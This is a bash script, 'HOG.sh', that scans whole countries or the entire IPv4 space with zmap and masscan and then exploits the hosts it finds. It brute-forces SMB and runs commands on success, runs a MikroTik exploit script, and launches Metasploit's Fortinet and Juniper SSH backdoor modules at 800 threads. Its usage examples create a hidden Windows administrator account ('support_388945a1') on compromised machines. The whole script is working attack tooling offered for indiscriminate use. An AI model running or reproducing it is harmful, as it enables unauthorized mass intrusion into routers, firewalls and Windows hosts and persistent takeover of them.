# should remove ip 0 and 255 after scanning complete

# cms
#check vulnerability
while [ "$#" -gt "0"  ] ; do
  case "$1" in

      -c)
      c="$2"
      shift 2
    ;;
      -o)
      o="$2"
      shift 2
    ;;
      -p)
      p="$2"
      shift 2
    ;;
      -pp)
      pp="$2"
      shift 2
    ;;
          -r)
      r="$2"
      shift 2
     ;;
      -l)
      l="$2"
      shift 2
    ;;
      -s)
      s="$2"
      shift 2
    ;;
     -cs)
      cs=1
      shift 1
    ;;
     -header)
      header=1
      shift 1
    ;;
     -e)
      e="$2"
      shift 2
    ;;
     -scan)
      scan="$2"
      shift 2
    ;;
      -uf)
      uf="$2"
      shift 2
    ;;
      -pf)
      pf="$2"
      shift 2
    ;;
      -cmd)
      cmd="$2"
      shift 2
    ;;
    -h|--help)
      echo "Unknown option $1.
        -c  get specefic country ip
        -o for path of save ip /tmp/ips
        -p for just one port scanning like -p 80 get all 80 port
        -pp for scanning multi port like -pp 80,3389,22
        -r for specefic range like 1.1.1.1-2.2.2.2
        -l for import file ip range for scanning you file must be cidr ip range like 1.1.1.0/24
        -s for give me site target.com i will check you site range port scanning you can use -p or -pp for site range
        -e for exploiting support mikrotik fortigate smb juniper
        -scan for scanning support wordpress joomla drupal sharepoint
        -uf user file  this switch use for smb exploit brute force for compelte smb exploit
        -pf password file this switch use for smb exploit brute force for compelte smb exploit
        -cmd this switch use for smb exploit you can add your desire command that want run after exploiting see down here in examples"
    shift 2
    ;;
    -ex|--examples)
    echo "examples:
bash HOG.sh -c AFGHANISTAN -p 80 -o /tmp/afghan80
bash HOG.sh -c AFGHANISTAN -pp 80,3389  -o  /tmp/afghan80-3389
bash HOG.sh -r 1.1.1.1-2.2.2.2 -p 80 -o /tmp/rangeport80
bash HOG.sh -r 1.1.1.1-2.2.2.2 -pp 80,3389 -o /tmp/rangeport80-3389
bash HOG.sh -l /tmp/target -p 80 -o /tmp/target80
bash HOG.sh -l  /tmp/target  -pp 80,3389 -o /tmp/target80-3389
bash HOG.sh -s x.com  -p 80  -o  /tmp/xrange80
bash HOG.sh -s x.com -pp 80,3389  -o   /tmp/xrange80-3389
bash HOG.sh -cs  -p 445 -o  /tmp/world445
bash HOG.sh -e smb -c AFGHANISTAN -uf usr -pf pwd -cmd \"net user support_388945a1 /ad & net localgroup administrators support_388945a1 /ad\"
bash HOG.sh -e smb -r 1.1.1.1-2.2.2.2 -uf usr -pf pwd -cmd \"net user support_388945a1 /ad & net localgroup administrators support_388945a1 /ad\"
bash HOG.sh -e smb -l /tmp/target  -uf usr -pf pwd -cmd \"net user support_388945a1 /ad & net localgroup administrators support_388945a1 /ad\"
bash HOG.sh -e smb -cs   -uf usr -pf pwd -cmd \"net user support_388945a1 /ad & net localgroup administrators support_388945a1 /ad\"
bash HOG.sh -e mikrotik -c AFGHANISTAN  -o /tmp/afghanmikexp
bash HOG.sh -e mikrotik -r 1.1.1.1-2.2.2.2 -o /tmp/rangemikrotikexp
bash HOG.sh -e mikrotik -l /tmp/target -o /tmp/targetmikrotikexp
bash HOG.sh -e mikrotik -cs   -o /tmp/worldmikrotikexp
bash HOG.sh -e fortigate -c AFGHANISTAN -o /tmp/afghanfortigateexp
bash HOG.sh -e fortigate -r 1.1.1.1-2.2.2.2 -o /tmp/rangefortigateexp
bash HOG.sh -e fortigate -l /tmp/target -o /tmp/targetfortigateexp
bash HOG.sh -e fortigate -cs   -o /tmp/worldfortigateexp
bash HOG.sh -e juniper -c AFGHANISTAN -o /tmp/afghanjuniperexp
bash HOG.sh -e juniper -r 1.1.1.1-2.2.2.2 -o /tmp/rangejuniperexp
bash HOG.sh -e juniper -l /tmp/target  -o /tmp/targetjuniperexp
bash HOG.sh -e juniper -cs   -o /tmp/worldjuniperexp
bash HOG.sh -scan wordpress -l /tmp/wpfile -o /tmp/wpout
bash HOG.sh -scan joomla -l /tmp/joomfile -o /tmp/joomout
bash HOG.sh -scan sharepoint -l /tmp/spfile -o /tmp/sharepointout
bash HOG.sh -scan drupal -l /tmp/drupfile -o /tmp/drupalout 
bash HOG.sh -dns
bash HOG.sh -sub
bash HOG.sh -l /tmp/targets -checks -o /tmp/targets/ 
bash HOG.sh -c AFGHANISTAN -router -o /tmp/afghanrouters/ 
bash HOG.sh -c AFGHANISTAN -range -o /tmp/afghanrange 
bash HOG.sh -l /tmp/sshcheck -ssh -o /tmp/sshenum
bash HOG.sh -l /tmp/rdp -rdp /tmp/screenshot/ 
bash HOG.sh -l /tmp/tg -scan webserver -o /tmp/webserver
bash HOG.sh -l /tmp/tg -headers -o /tmp/header "

#routesploit
#just get range for lazyssh
#ssh enumeration
#rdp screenshot
#web servers
#web headers
        shift 2
        ;;
        -*)
         echo "Unknown option $1 see helo with -h and examples with -ex try again!"
      exit 1
    ;;
    *)
      CMD="$1"
      break
    ;;
  esac
done
DATE=`date '+%Y-%m-%d-%H:%M:%S'`
###########################Functions##########################################
function country() {
declare -A country 
country=( [1]=AFGHANISTAN [2]="ALAND+ISLANDS" [3]=ALBANIA [4]=ALGERIA [5]="AMERICAN+SAMOA" [6]=ANDORRA [7]=ANGOLA [8]=ANGUILLA [9]="ANTIGUA+AND+BARBUDA" [10]=ARGENTINA [11]=ARMENIA [12]=ARUBA [13]=AUSTRALIA [14]=AUSTRIA [15]=AZERBAIJAN [16]=BAHAMAS [17]=BAHRAIN [18]=BANGLADESH [19]=BARBADOS [20]=BELARUS [21]=BELGIUM [22]=BELIZE [23]=BENIN [24]=BERMUDA [25]=BHUTAN [26]=BOLIVIA [27]="BONAIRE%3B+SINT+EUSTATIUS%3B+SABA" [28]="BOSNIA+AND+HERZEGOWINA" [29]=BOTSWANA [30]=BRAZIL [31]="BRITISH+INDIAN+OCEAN+TERRITORY" [32]="BRUNEI+DARUSSALAM" [33]=BULGARIA [34]="BURKINA+FASO" [35]=BURUNDI [36]=CAMBODIA [37]=CAMEROON [38]=CANADA [39]="CAPE+VERDE" [40]="CAYMAN+ISLANDS" [41]="CENTRAL+AFRICAN+REPUBLIC" [42]=CHAD [43]=CHILE [44]=CHINA [45]=COLOMBIA [46]=COMOROS [47]=CONGO [48]="CONGO+THE+DEMOCRATIC+REPUBLIC+OF+THE" [49]="COOK+ISLANDS" [50]="COSTA+RICA" [51]="COTE+D'IVOIRE" [52]="CROATIA+(LOCAL+NAME%3A+HRVATSKA)" [53]=CUBA [54]=CURACAO [55]=CYPRUS [56]="CZECH+REPUBLIC" [57]=DENMARK [58]=DJIBOUTI [59]=DOMINICA [60]="DOMINICAN+REPUBLIC" [61]=ECUADOR [62]=EGYPT [63]="EL+SALVADOR" [64]="EQUATORIAL+GUINEA" [65]=ERITREA [66]=ESTONIA [67]=ETHIOPIA [68]="EUROPEAN+UNION" [69]="FALKLAND+ISLANDS+(MALVINAS)" [70]="FAROE+ISLANDS" [71]=FIJI [72]=FINLAND [73]=FRANCE [74]="FRENCH+GUIANA" [75]="FRENCH+POLYNESIA" [76]=GABON [77]=GAMBIA [78]=GEORGIA [79]=GERMANY [80]=GHANA [81]=GIBRALTAR [82]=GREECE [83]=GREENLAND [84]=GRENADA [85]=GUADELOUPE [86]=GUAM [87]=GUATEMALA [88]=GUERNSEY [89]=GUINEA [90]=GUINEA-BISSAU [91]=GUYANA [92]=HAITI [93]="HOLY+SEE+(VATICAN+CITY+STATE)" [94]=HONDURAS [95]="HONG+KONG" [96]=HUNGARY [97]=ICELAND [98]=INDIA [99]=INDONESIA [100]="IRAN+(ISLAMIC+REPUBLIC+OF)" [101]=IRAQ [102]=IRELAND [103]="ISLE+OF+MAN" [104]=ISRAEL [105]=ITALY [106]=JAMAICA [107]=JAPAN [108]=JERSEY [109]=JORDAN [110]=KAZAKHSTAN [111]=KENYA [112]=KIRIBATI [113]="KOREA+DEMOCRATIC+PEOPLE'S+REPUBLIC+OF" [114]="KOREA+REPUBLIC+OF" [115]=KUWAIT [116]=KYRGYZSTAN [117]="LAO+PEOPLE'S+DEMOCRATIC+REPUBLIC" [118]=LATVIA [119]=LEBANON [120]=LESOTHO [121]=LIBERIA [122]="LIBYAN+ARAB+JAMAHIRIYA" [123]=LIECHTENSTEIN [124]=LITHUANIA [125]=LUXEMBOURG [126]=MACAU [127]=MACEDONIA [128]=MADAGASCAR [129]=MALAWI [130]=MALAYSIA [131]=MALDIVES [132]=MALI [133]=MALTA [134]="MARSHALL+ISLANDS" [135]=MARTINIQUE [136]=MAURITANIA [137]=MAURITIUS [138]=MAYOTTE [139]=MEXICO [140]="MICRONESIA+FEDERATED+STATES+OF" [141]="MOLDOVA+REPUBLIC+OF" [142]=MONACO [143]=MONGOLIA [144]=MONTENEGRO [145]=MONTSERRAT [146]=MOROCCO [147]=MOZAMBIQUE [148]=MYANMAR [149]=NAMIBIA [150]=NAURU [151]=NEPAL [152]=NETHERLANDS [153]="NEW+CALEDONIA" [154]="NEW+ZEALAND" [155]=NICARAGUA [156]=NIGER [157]=NIGERIA [158]=NIUE [159]="NORFOLK+ISLAND" [160]="NORTHERN+MARIANA+ISLANDS" [161]=NORWAY [162]=OMAN [163]=PAKISTAN [164]=PALAU [165]="PALESTINIAN+TERRITORY+OCCUPIED" [166]=PANAMA [167]="PAPUA+NEW+GUINEA" [168]=PARAGUAY [169]=PERU [170]=PHILIPPINES [171]=POLAND [172]=PORTUGAL [173]="PUERTO+RICO" [174]=QATAR [175]=RESERVED [176]=REUNION [177]=ROMANIA [178]=RUSSIAN+FEDERATION [179]=RWANDA [180]="SAINT+KITTS+AND+NEVIS" [181]="SAINT+LUCIA" [182]="SAINT+MARTIN" [183]="SAINT+VINCENT+AND+THE+GRENADINES" [184]=SAMOA [185]="SAN+MARINO" [186]="SAO+TOME+AND+PRINCIPE" [187]="SAUDI+ARABIA" [188]=SENEGAL [189]=SERBIA [190]=SEYCHELLES [191]="SIERRA+LEONE" [192]=SINGAPORE [193]="SINT+MAARTEN" [194]="SLOVAKIA+(SLOVAK+REPUBLIC)" [195]=SLOVENIA [196]="SOLOMON+ISLANDS" [197]=SOMALIA [198]="SOUTH+AFRICA" [199]="SOUTH+SUDAN" [200]=SPAIN [201]="SRI+LANKA" [202]="ST.+PIERRE+AND+MIQUELON" [203]=SUDAN [204]=SURINAME [205]=SWAZILAND [206]=SWEDEN [207]=SWITZERLAND [208]="SYRIAN+ARAB+REPUBLIC" [209]="TAIWAN%3B+REPUBLIC+OF+CHINA+(ROC)" [210]=TAJIKISTAN [211]="TANZANIA+UNITED+REPUBLIC+OF" [212]=THAILAND [213]=TIMOR-LESTE [214]=TOGO [215]=TOKELAU [216]=TONGA [217]="TRINIDAD+AND+TOBAGO" [218]=TUNISIA [219]=TURKEY [220]=TURKMENISTAN [221]="TURKS+AND+CAICOS+ISLANDS" [222]=TUVALU [223]=UGANDA [224]=UKRAINE [225]="UNITED+ARAB+EMIRATES" [226]="UNITED+KINGDOM" [227]="UNITED+STATES" [228]=URUGUAY [229]=UZBEKISTAN [230]=VANUATU [231]=VENEZUELA [232]="VIET+NAM" [233]="VIRGIN+ISLANDS+(BRITISH)" [234]="VIRGIN+ISLANDS+(U.S.)" [235]="WALLIS+AND+FUTUNA+ISLANDS" [236]=YEMEN [237]=ZAMBIA [238]=ZIMBABWE )
if ( grep  ${country[$c]}  source );
then
wget `grep  ${country[$c]} source` -O `echo "$o" | cut -d'=' -f 2`;
else
echo " we support this country enter your number want as -c switch [1]=AFGHANISTAN [2]=ALAND+ISLANDS [3]=ALBANIA [4]=ALGERIA [5]=AMERICAN+SAMOA [6]=ANDORRA [7]=ANGOLA [8]=ANGUILLA [9]=ANTIGUA+AND+BARBUDA [10]=ARGENTINA [11]=ARMENIA [12]=ARUBA [13]=AUSTRALIA [14]=AUSTRIA [15]=AZERBAIJAN [16]=BAHAMAS [17]=BAHRAIN [18]=BANGLADESH [19]=BARBADOS [20]=BELARUS [21]=BELGIUM [22]=BELIZE [23]=BENIN [24]=BERMUDA [25]=BHUTAN [26]=BOLIVIA [27]=BONAIRE%3B+SINT+EUSTATIUS%3B+SABA [28]=BOSNIA+AND+HERZEGOWINA [29]=BOTSWANA [30]=BRAZIL [31]=BRITISH+INDIAN+OCEAN+TERRITORY [32]=BRUNEI+DARUSSALAM [33]=BULGARIA [34]=BURKINA+FASO [35]=BURUNDI [36]=CAMBODIA [37]=CAMEROON [38]=CANADA [39]=CAPE+VERDE [40]=CAYMAN+ISLANDS [41]=CENTRAL+AFRICAN+REPUBLIC [42]=CHAD [43]=CHILE [44]=CHINA [45]=COLOMBIA [46]=COMOROS [47]=CONGO [48]=CONGO+THE+DEMOCRATIC+REPUBLIC+OF+THE [49]=COOK+ISLANDS [50]=COSTA+RICA [51]=COTE+D'IVOIRE [52]=CROATIA+(LOCAL+NAME%3A+HRVATSKA) [53]=CUBA [54]=CURACAO [55]=CYPRUS [56]=CZECH+REPUBLIC [57]=DENMARK [58]=DJIBOUTI [59]=DOMINICA [60]=DOMINICAN+REPUBLIC [61]=ECUADOR [62]=EGYPT [63]=EL+SALVADOR [64]=EQUATORIAL+GUINEA [65]=ERITREA [66]=ESTONIA [67]=ETHIOPIA [68]=EUROPEAN+UNION [69]=FALKLAND+ISLANDS+(MALVINAS) [70]=FAROE+ISLANDS [71]=FIJI [72]=FINLAND [73]=FRANCE [74]=FRENCH+GUIANA [75]=FRENCH+POLYNESIA [76]=GABON [77]=GAMBIA [78]=GEORGIA [79]=GERMANY [80]=GHANA [81]=GIBRALTAR [82]=GREECE [83]=GREENLAND [84]=GRENADA [85]=GUADELOUPE [86]=GUAM [87]=GUATEMALA [88]=GUERNSEY [89]=GUINEA [90]=GUINEA-BISSAU [91]=GUYANA [92]=HAITI [93]=HOLY+SEE+(VATICAN+CITY+STATE) [94]=HONDURAS [95]=HONG+KONG [96]=HUNGARY [97]=ICELAND [98]=INDIA [99]=INDONESIA [100]=IRAN+(ISLAMIC+REPUBLIC+OF) [101]=IRAQ [102]=IRELAND [103]=ISLE+OF+MAN [104]=ISRAEL [105]=ITALY [106]=JAMAICA [107]=JAPAN [108]=JERSEY [109]=JORDAN [110]=KAZAKHSTAN [111]=KENYA [112]=KIRIBATI [113]=KOREA+DEMOCRATIC+PEOPLE'S+REPUBLIC+OF [114]=KOREA+REPUBLIC+OF [115]=KUWAIT [116]=KYRGYZSTAN [117]=LAO+PEOPLE'S+DEMOCRATIC+REPUBLIC [118]=LATVIA [119]=LEBANON [120]=LESOTHO [121]=LIBERIA [122]=LIBYAN+ARAB+JAMAHIRIYA [123]=LIECHTENSTEIN [124]=LITHUANIA [125]=LUXEMBOURG [126]=MACAU [127]=MACEDONIA [128]=MADAGASCAR [129]=MALAWI [130]=MALAYSIA [131]=MALDIVES [132]=MALI [133]=MALTA [134]=MARSHALL+ISLANDS [135]=MARTINIQUE [136]=MAURITANIA [137]=MAURITIUS [138]=MAYOTTE [139]=MEXICO [140]=MICRONESIA+FEDERATED+STATES+OF [141]=MOLDOVA+REPUBLIC+OF [142]=MONACO [143]=MONGOLIA [144]=MONTENEGRO [145]=MONTSERRAT [146]=MOROCCO [147]=MOZAMBIQUE [148]=MYANMAR [149]=NAMIBIA [150]=NAURU [151]=NEPAL [152]=NETHERLANDS [153]=NEW+CALEDONIA [154]=NEW+ZEALAND [155]=NICARAGUA [156]=NIGER [157]=NIGERIA [158]=NIUE [159]=NORFOLK+ISLAND [160]=NORTHERN+MARIANA+ISLANDS [161]=NORWAY [162]=OMAN [163]=PAKISTAN [164]=PALAU [165]=PALESTINIAN+TERRITORY+OCCUPIED [166]=PANAMA [167]=PAPUA+NEW+GUINEA [168]=PARAGUAY [169]=PERU [170]=PHILIPPINES [171]=POLAND [172]=PORTUGAL [173]=PUERTO+RICO [174]=QATAR [175]=RESERVED [176]=REUNION [177]=ROMANIA [178]=RUSSIAN+FEDERATION [179]=RWANDA [180]=SAINT+KITTS+AND+NEVIS [181]=SAINT+LUCIA [182]=SAINT+MARTIN [183]=SAINT+VINCENT+AND+THE+GRENADINES [184]=SAMOA [185]=SAN+MARINO [186]=SAO+TOME+AND+PRINCIPE [187]=SAUDI+ARABIA [188]=SENEGAL [189]=SERBIA [190]=SEYCHELLES [191]=SIERRA+LEONE [192]=SINGAPORE [193]=SINT+MAARTEN [194]=SLOVAKIA+(SLOVAK+REPUBLIC) [195]=SLOVENIA [196]=SOLOMON+ISLANDS [197]=SOMALIA [198]=SOUTH+AFRICA [199]=SOUTH+SUDAN [200]=SPAIN [201]=SRI+LANKA [202]=ST.+PIERRE+AND+MIQUELON [203]=SUDAN [204]=SURINAME [205]=SWAZILAND [206]=SWEDEN [207]=SWITZERLAND [208]=SYRIAN+ARAB+REPUBLIC [209]=TAIWAN%3B+REPUBLIC+OF+CHINA+(ROC) [210]=TAJIKISTAN [211]=TANZANIA+UNITED+REPUBLIC+OF [212]=THAILAND [213]=TIMOR-LESTE [214]=TOGO [215]=TOKELAU [216]=TONGA [217]=TRINIDAD+AND+TOBAGO [218]=TUNISIA [219]=TURKEY [220]=TURKMENISTAN [221]=TURKS+AND+CAICOS+ISLANDS [222]=TUVALU [223]=UGANDA [224]=UKRAINE [225]=UNITED+ARAB+EMIRATES [226]=UNITED+KINGDOM [227]=UNITED+STATES [228]=URUGUAY [229]=UZBEKISTAN [230]=VANUATU [231]=VENEZUELA [232]=VIET+NAM [233]=VIRGIN+ISLANDS+(BRITISH) [234]=VIRGIN+ISLANDS+(U.S.) [235]=WALLIS+AND+FUTUNA+ISLANDS [236]=YEMEN [237]=ZAMBIA [238]=ZIMBABWE " 
fi

sleep 5
echo "prepare your file"
grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b-\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" $o > $o-1
sleep 5
export LANGUAGE=en_US.UTF-8
export LC_ALL=en_US.UTF-8
export LANG=en_US.UTF-8
export LC_TYPE=en_US.UTF-8
while IFS='' read -r line || [[ -n "$line" ]]; do
    ipcalc "$line" >> $o-2
done < "$o-1"

echo "your ip cidr file ready to scan good luck! $o-c"
grep -v deaggregate $o-2 > $o-c
rm $o
rm $o-1
rm $o-2
sleep 10
}
#$o-c file aslias
function zmap-country () {
        clear
        echo "start scanning"
        zmap -p $p $(cat $o-c)  -o $o
        if pgrep zmap ; then echo "zmap running" ; else rm $o-c ; fi
}
function zmap-range () {
        clear
        echo "start scanning"
        zmap -p $p $r  -o $o
}
function zmap-file () {
        clear
        echo "start scanning"
        zmap -p $p $(cat $l)  -o $o
}

function site() {
ip=$( nslookup $s | grep -v 1.1.1.1 | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" )
for x in $ip ; do masscan -p $p $pp $x/24 -oX $o-$x.xml ; done
for y in $ip ; do cat $o-$y.xml | grep  -PZo "(\d*\.\d*\.\d*\.\d*).*portid=\"(\d*)" | sed  's/" addrtype\=\"ipv4\"\/><ports><port protocol=\"tcp\" portid="/:/' | tee $o-$y ; done
}

function countryall() {
  path="/tmp/countryall/"
  rm $path
  mkdir /tmp/countryall/

while IFS='' read -r line || [[ -n "$line" ]]; do
    sleep 2
    wget $line -O $path/`echo "$line" | cut -d'=' -f 2`
done < "source"
cat $path/* >> $path/countryall
}

###################################conditions##################
 if [[ -z $pp ]] && [[ -z $s ]] && [[ -z $r ]] && [[ -z $cs ]] && [[ ! -z $c && ! -z $p && ! -z $o ]]  ; then
        clear
        country
        zmap-country
        exit 1
        fi
if [[  -z $p ]] && [[ -z $s ]] && [[ -z $r ]] && [[ -z $cs ]] && [[ ! -z $c && ! -z $pp &&  ! -z $o ]] ; then
        clear
        country
        clear
        echo "start scanning"
        masscan -p $pp -iL $o-c -oX $o.xml
        while true ; do
        if pgrep masscan ;
        then echo "masscan running" ;
        else cat $o.xml | grep  -PZo "(\d*\.\d*\.\d*\.\d*).*portid=\"(\d*)" | sed  's/" addrtype\=\"ipv4\"\/><ports><port protocol=\"tcp\" portid="/:/' | tee $o  ;
        break
        fi
        done      
        exit 1
        fi
if  [[ -z $pp ]] && [[ -z $c ]] && [[ -z $s ]] && [[ -z $cs ]] && [[ ! -z  $r && ! -z $p && ! -z $o ]] ; then
        clear
        zmap-range
        exit 1
        fi

if [[ -z $p ]] &&  [[ -z $c ]] && [[ -z $s ]] && [[ -z $cs ]] && [[ ! -z $r &&  ! -z  $pp &&   ! -z $o ]] ; then
        clear
        echo "start scanning"
        masscan -p $pp $r -oX $o.xml
        while true ; do
        if pgrep masscan ;
        then echo "masscan running" ;
        else cat $o.xml | grep  -PZo "(\d*\.\d*\.\d*\.\d*).*portid=\"(\d*)" | sed  's/" addrtype\=\"ipv4\"\/><ports><port protocol=\"tcp\" portid="/:/' | tee $o  ;
        break
        fi
        done
        exit 1
        fi

if [[ -z $pp ]] && [[ -z $cs ]] && [[ ! -z $s &&  ! -z $p &&  ! -z $o ]] ; then
        clear
        site
        exit 1
fi

if [[ -z $p ]] && [[ -z $cs ]] && [[ ! -z $s && ! -z $pp && ! -z $o ]]; then
        clear
        site
        exit 1
fi

if  [[ -z $pp ]] && [[ -z $cs ]] && [[  ! -z $l && ! -z $p &&  ! -z $o ]]; then
        clear
        zmap-file
        exit 1
fi
if  [[ -z $p ]] && [[ -z $cs ]] && [[ ! -z $l && ! -z $pp && ! -z $o ]]; then
        clear
        echo "start scanning"
        masscan -p $pp -iL $l -oX $o.xml
        while true ; do
        if pgrep masscan ;
        then echo "masscan running" ;
        else cat $o.xml | grep  -PZo "(\d*\.\d*\.\d*\.\d*).*portid=\"(\d*)" | sed  's/" addrtype\=\"ipv4\"\/><ports><port protocol=\"tcp\" portid="/:/' | tee $o  ;
          break
        fi
      done
        exit 1
fi

if [[ -z $pp ]] && [[ -z $c ]] && [[ -z $r ]] && [[  $cs = "1"  && ! -z $p && ! -z $o ]]; then
        clear
        countryall
        path="/tmp/countryall/"
        zmap -p $p $(cat $path/countryall)  -o $o
        exit 1
fi
if  [[ -z $cs ]] && [[ $e = "smb"  && ! -z $c && ! -z $uf && ! -z $pf && ! -z $cmd && ! -z $o ]] ; then
        clear
        country
        sleep 10
        echo "start scanning"
        zmap -p 445 $(cat $o-c)  -o $o-m
        if pgrep zmap ; then echo "zmap running" ; else rm $o-c ; fi
        python smb.py $o-m $uf $pf $cmd
        if pgrep smb.py ; then echo "exploiting not done yet!" ; else echo " exploting compelte see good.txt in current directory" ; fi
        exit 1
fi
if  [[ -z $cs ]] && [[ $e = "smb" && ! -z $r  && ! -z $uf && ! -z $pf && ! -z $cmd && ! -z $o ]]; then
        clear
        echo "start scanning"
        zmap -p 445 $r -o  $o-m
        if pgrep zmap ; then echo "zmap running" ; else rm $o-c ; fi
        python smb.py $o-m $uf $pf $cmd
        if pgrep smb.py ; then echo "exploiting not done yet!" ; else echo " exploting compelte see good.txt in current directory" ; fi
        
        exit 1
fi
if [[ -z $cs ]] && [[ $e = "smb" && ! -z $l && ! -z $uf && ! -z $pf && ! -z $cmd &&  ! -z $o ]]; then
        clear
        echo "start scanning"
        zmap -p 445 $(cat $l) -o  $o-m
        python smb.py $o-m $uf $pf $cmd
        if pgrep smb.py ; then echo "exploiting not done yet!" ; else echo " exploting compelte see good.txt in current directory" ; fi
        
        exit 1
fi
if [[ $e = "smb" && ! -z $o && $cs = "1" && ! -z $uf && ! -z $pf && ! -z $cmd && ! -z $o ]]; then
        clear
        countryall
        sleep 10
        echo "start scanning"
        path="/tmp/countryall/"
        zmap -p $p $(cat $path/countryall)  -o $o-s
        python smb.py $o-s $uf $pf $cmd
        if pgrep smb.py ; then echo "exploiting not done yet!" ; else echo " exploting compelte see good.txt in current directory" ; fi
        
        exit 1
fi
if [[ -z $cs ]] && [[ $e = "mikrotik" && ! -z $c && ! -z $o ]]; then
        clear
        country
        sleep 10
        echo "start scanning"
        zmap -p 8291 $(cat $o-c)  -o $o-m
        if pgrep zmap ; then echo "zmap running" ; else rm $o-c ; fi
        file="$o-m"
        while IFS= read line
        do
        python3 mik.py $line >> $o-exploited
        done <"$file"
        echo "done see $o-exploited  !"
        exit 1
fi
if [[ -z $cs ]] && [[ $e = "mikrotik" && ! -z $r && ! -z $o ]]; then
        clear
        echo "start scanning"
        zmap -p 8291 $r -o  $o-m
        file="$o-m"
        while IFS= read line
        do
        python3 mik.py $line >> $o-exploited
        done <"$file"
        echo "done see $o-exploited  !"
        exit 1
fi

if [[ -z $cs ]] && [[ $e = "mikrotik" && ! -z $l && ! -z $o ]]; then
        clear
        zmap -p 8291 $(cat $l) -o  $o-m
        file="$o-m"
        while IFS= read line
        do
        python3 mik.py $line >> $o-exploited
        done <"$file"
        echo "done see $o-exploited  !"
        exit 1
fi
if [[ $e = "mikrotik" && $cs = "1" && ! -z $o ]]; then
        clear
        echo "run HOG.sh -e $e -cs  -o $o"
        countryall
        path="/tmp/countryall/"
        zmap -p 8291 $(cat $path/countryall)  -o $o-m
        file="$o-m"
        while IFS= read line
        do
        python3 mik.py $line >> $o-exploited
        done <"$file"
        echo "done see $o-exploited  !"

        exit 1
fi
# bash HOG.sh -e fortigate -c AFGHANISTAN -o /tmp/afghanfortigateexp
if [[ -z $cs ]] && [[ $e = "fortigate" && ! -z $c && ! -z $o ]]; then
        clear
        echo "run HOG.sh -e $e -c $c -o $o"
        country
        echo "spool $o-$DATE" > /tmp/fortigate.rc
        echo "use auxiliary/scanner/ssh/fortinet_backdoor" >> /tmp/fortigate.rc
        echo "set rhosts file:$o-c" >> /tmp/fortigate.rc
        echo "set threads 800" >> /tmp/fortigate.rc
        echo "exploit -j -z" >> /tmp/fortigate.rc
        msfconsole -r /tmp/fortigate.rc
        exit 1
fi
# bash HOG.sh -e fortigate -r 1.1.1.1-2.2.2.2 -o /tmp/rangefortigateexp
if [[ -z $cs ]] && [[ $e = "fortigate" && ! -z $r && ! -z $o ]]; then
        clear
        echo "run HOG.sh -e $e -r $r -o $o"
        echo "spool $o-$DATE" > /tmp/fortigate.rc
        echo "use auxiliary/scanner/ssh/fortinet_backdoor" >> /tmp/fortigate.rc
        echo "set rhosts $r" >> /tmp/fortigate.rc
        echo "set threads 800" >> /tmp/fortigate.rc
        echo "exploit -j -z" >> /tmp/fortigate.rc
        msfconsole -r /tmp/fortigate.rc
        exit 1
fi
# bash HOG.sh -e fortigate -l /tmp/target -o /tmp/targetfortigateexp
if [[ -z $cs ]] && [[ $e = "fortigate" && ! -z $l && ! -z $o ]]; then
        clear
        echo "run HOG.sh -e $e -l $l -o $o"
        echo "spool $o-$DATE" > /tmp/fortigate.rc
        echo "use auxiliary/scanner/ssh/fortinet_backdoor" >> /tmp/fortigate.rc
        echo "set rhosts file:$l" >> /tmp/fortigate.rc
        echo "set threads 800" >> /tmp/fortigate.rc
        echo "exploit -j -z" >> /tmp/fortigate.rc
        msfconsole -r /tmp/fortigate.rc
        exit 1
fi
# bash HOG.sh -e fortigate -cs   -o /tmp/worldfortigateexp
if [[ $e = "fortigate" && $cs = "1" && ! -z $o ]]; then
        clear
        echo "run HOG.sh -e $e -cs -o $o"
        countryall
        path="/tmp/countryall/"
        echo "spool $o-$DATE" > /tmp/fortigate.rc
        echo "use auxiliary/scanner/ssh/fortinet_backdoor" >> /tmp/fortigate.rc
        echo "set rhosts file:$path/countryall" >> /tmp/fortigate.rc
        echo "set threads 800" >> /tmp/fortigate.rc
        echo "exploit -j -z" >> /tmp/fortigate.rc
        msfconsole -r /tmp/fortigate.rc
        exit 1
fi
# bash HOG.sh -e juniper -c AFGHANISTAN -o /tmp/afghanjuniperexp
if [[ -z $cs ]] && [[ $e = "juniper" && ! -z $c  && ! -z $o ]]; then
        clear
        echo "run HOG.sh -e $e -c $c -o $o"
        country
        echo "spool $o-$DATE" > /tmp/fortigate.rc
        echo "use auxiliary/scanner/ssh/juniper_backdoor" >> /tmp/juniper.rc
        echo "set rhosts file:$o-c" >> /tmp/juniper.rc
        echo "set threads 800" >> /tmp/juniper.rc
        echo "exploit -j -z" >> /tmp/juniper.rc
        msfconsole -r /tmp/juniper.rc
        exit 1
fi
# bash HOG.sh -e juniper -r 1.1.1.1-2.2.2.2 -o /tmp/rangejuniperexp
if [[ -z $cs ]] && [[ $e = "juniper" && ! -z $r && ! -z $o ]]; then
        clear
        echo "run HOG.sh -e $e -r $r -o $o"
        echo "spool $o-$DATE" > /tmp/fortigate.rc
        echo "use auxiliary/scanner/ssh/juniper_backdoor" >> /tmp/juniper.rc
        echo "set rhosts $r" >> /tmp/juniper.rc
        echo "set threads 800" >> /tmp/juniper.rc
        echo "exploit -j -z" >> /tmp/juniper.rc
        msfconsole -r /tmp/juniper.rc
        exit 1
fi
# bash HOG.sh -e juniper -l /tmp/target  -o /tmp/targetjuniperexp
if [[ -z $cs ]] && [[ $e = "juniper" && ! -z $l && ! -z $o ]]; then
        clear
        echo "run HOG.sh -e $e -l $l -o $o"
        echo "spool $o-$DATE" > /tmp/fortigate.rc
        echo "use auxiliary/scanner/ssh/juniper_backdoor" >> /tmp/juniper.rc
        echo "set rhosts file:$l" >> /tmp/juniper.rc
        echo "set threads 800" >> /tmp/juniper.rc
        echo "exploit -j -z" >> /tmp/juniper.rc
        msfconsole -r /tmp/juniper.rc
        exit 1
fi
# bash HOG.sh -e juniper -cs   -o /tmp/worldjuniperexp
if [[ $e = "juniper" && $cs = "1" && ! -z $o ]]; then
        clear
        echo "run HOG.sh -e $e -cs  -o $o"
        countryall
        path="/tmp/countryall/"
        echo "spool $o-$DATE" > /tmp/juniper.rc
        echo "use auxiliary/scanner/ssh/juniper_backdoor" >> /tmp/juniper.rc
        echo "set rhosts file:$path/countryall" >> /tmp/juniper.rc
        echo "set threads 800" >> /tmp/juniper.rc
        echo "exploit -j -z" >> /tmp/juniper.rc
        msfconsole -r /tmp/fortigate.rc

        exit 1
fi
# bash HOG.sh -scan wordpress -l /tmp/wpfile -o /tmp/output
